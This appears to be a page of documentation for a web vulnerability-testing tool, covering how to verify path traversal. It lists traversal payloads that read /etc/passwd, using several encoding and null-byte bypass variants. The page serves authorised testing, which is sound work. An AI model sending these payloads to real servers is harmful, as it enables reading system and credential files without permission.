# Path Traversal (Directory Traversal)

Inject path sequences (e.g., `../`, `..\`) that allow reading files outside the intended directory.

## Response Regex Verification

Construct HTTP requests containing malicious file paths that cause the **target server** to read arbitrary files, match output against regex pattern to confirm file content.

### Target: /etc/passwd

Attempt to read the `/etc/passwd` file using path traversal sequences:
- Standard traversal: `../../../etc/passwd`
- URL encoding: `..%2f..%2f..%2fetc%2fpasswd`
- Double encoding: `..%252f..%252f..%252fetc%252fpasswd`
- Unicode encoding: `..%c0%af..%c0%af..%c0%afetc/passwd`
- Null byte bypass (PHP < 5.3.4): `../../../etc/passwd%00.jpg`

> See [Regex Verification](../verification/regex.md) for workflow and validation.
